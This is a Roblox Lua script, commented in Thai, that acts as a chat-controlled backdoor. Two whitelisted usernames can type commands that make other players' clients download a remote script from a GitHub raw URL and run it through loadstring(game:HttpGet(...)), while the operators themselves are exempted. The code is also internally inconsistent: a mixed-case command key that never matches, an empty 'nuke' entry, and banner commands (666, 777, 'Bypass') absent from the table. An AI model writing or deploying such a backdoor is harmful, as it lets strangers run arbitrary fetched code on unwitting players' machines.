local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- 🕸️ ตารางลับ: ผู้มีสิทธิ์สั่งการ
local AUTHORIZED_USERS = {
    "jgjkjgj4",
    "birdV2_123",
}

-- 🔗 ลิงก์สคริปต์คำสั่ง
local SCRIPTS = {
    ["Shockwave"] = "https://raw.githubusercontent.com/wino444/cityThai/refs/heads/main/Shockwave%20Sphere%20Simulator.lua", -- 💀 Wither
    ["nuke"] = "", -- 🔥 
    -- เพิ่มคำสั่งใหม่ได้ที่นี่!
}

-- ตรวจสอบสิทธิ์
local function isAuthorized(player)
    for _, name in ipairs(AUTHORIZED_USERS) do
        if player.Name == name then return true end
    end
    return false
end

-- ป้องกันรันในตัวผู้สั่ง
local function isSelfProtected()
    return table.find(AUTHORIZED_USERS, LocalPlayer.Name)
end

-- รันสคริปต์ด้วยความปลอดภัย
local function runScript(url, scriptName)
    if isSelfProtected() then
        print("🛡️ ปกป้อง "..LocalPlayer.Name.." – ไม่รัน "..scriptName.." ในตัวเขา!")
        return
    end

    local success, err = pcall(function()
        loadstring(game:HttpGet(url))()
    end)

    if success then
        print("✅ "..scriptName.." ถูกปลดปล่อยแล้ว!")
    else
        warn("⚠️ "..scriptName.." ล้มเหลว! Error: "..tostring(err))
    end
end

-- ดักแชท
local function onPlayerChatted(player)
    if isAuthorized(player) then
        player.Chatted:Connect(function(message)
            local cmd = message:lower()

            if SCRIPTS[cmd] then
                print("🔥 คำสั่ง '"..cmd.."' ถูกเรียกโดย "..player.Name.."!")
                runScript(SCRIPTS[cmd], cmd:upper().." Script")
            end
        end)
    end
end

-- รันกับผู้เล่นเดิม + ใหม่
for _, player in ipairs(Players:GetPlayers()) do
    onPlayerChatted(player)
end
Players.PlayerAdded:Connect(onPlayerChatted)

print("🕸️ Dual Curse พร้อม! | 666 = Wither | 777 = Bypass | สมาชิก: "..#AUTHORIZED_USERS.." คน 🕸️")
